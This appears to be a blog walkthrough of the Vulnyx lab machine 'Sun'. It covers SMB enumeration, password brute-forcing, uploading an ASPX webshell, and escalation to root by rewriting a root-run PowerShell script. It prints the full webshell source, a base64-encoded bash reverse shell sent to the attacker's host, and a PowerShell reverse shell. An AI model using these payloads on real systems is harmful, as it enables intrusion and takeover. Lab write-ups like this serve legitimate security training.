## FIrst enumeration with nmap 

```shell
# Nmap 7.94SVN scan initiated Sun Apr 14 08:46:48 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 22,80,139,445,8080 -Pn 172.16.246.131
Nmap scan report for 172.16.246.131
Host is up (0.00074s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http        nginx 1.22.1
|_http-title: Sun
|_http-server-header: nginx/1.22.1
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8080/tcp open  http        nginx 1.22.1
|_http-title: Sun
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SUN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: -2s
| smb2-time: 
|   date: 2024-04-14T07:47:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 14 08:47:13 2024 -- 1 IP address (1 host up) scanned in 25.22 seconds
```


## Enumerating SMB 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/Vulnyx/Sun]
└─$ smbclient -L 172.16.246.131 -N 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      File Upload Path
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 172.16.246.131 (for a protocol between NT1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```
checking for anonymous shares available for us, we can see that the share `nobody`.  

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1ec4ebf9-36d2-47a6-be72-1786f14f49a4)

found a username `punt4n0` 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6121381a-0bb4-48aa-9376-48a65067e319)

try to bruteforce the password for the user, 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/eea2fea3-fcb6-4e47-b03d-8a39c07cb20c)

found the password `sunday`. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/743bf7ac-f167-4d6e-b8c7-89748926f5a8)

using the creds gotten to check if we have share access to the shares in smb. we got read,write access to one of the shares

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c0b95659-f72e-47b7-87fc-56cb072be2f1)

login to download some file and uploaded a file into the share. 

```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">

protected void Page_Load(object sender, EventArgs e)
{
    string cmd = Request["cmd"];
    
    if (!string.IsNullOrEmpty(cmd))
    {
        ExecuteCommand(cmd);
    }
}

private void ExecuteCommand(string command)
{
    try
    {
        Process proc = new Process();
        proc.StartInfo.FileName = "/bin/bash";
        proc.StartInfo.Arguments = "-c \"" + command + "\"";
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.CreateNoWindow = true;
        proc.Start();
        
        string output = proc.StandardOutput.ReadToEnd();
        Response.Write(output);
        proc.WaitForExit();
    }
    catch (Exception ex)
    {
        Response.Write("Error: " + ex.Message);
    }
}

</script>
```
uploading an aspx webshell gotten from a friend. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0fd4221b-98e5-4f82-83e4-6e0d46b88268)

uploaded it. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/1555c4a2-eebd-474c-bfc3-d5c731d1cf23)

navigating to the shell path `http://172.16.246.131:8080/pwned.aspx?cmd=id`, we triggered RCE. 

```
http://172.16.246.131:8080/pwned.aspx?cmd=echo%20%22L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNi4yNDYuMS84MCAwPiYx%22%20|%20base64%20-d%20|%20bash
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e6f41763-6dd4-45f7-9a51-0d65d2e86653)

Using the payload above, we spawned a reverse shell.



## Privilege Escalation

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/57dba1c1-2f33-40bd-b3af-6d45b2e960f7)

running pspy, we can see a powershell script running as root. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a2ec49df-1d98-479f-a594-1196168e6725)

```ps
$LHOST = "172.16.246.1"; $LPORT = 80; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```
modified the `service.ps1` script, and wait for 1 min 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a18829d5-c074-47f5-98df-d78a1fa87217)

got a reverse shell as `root`.

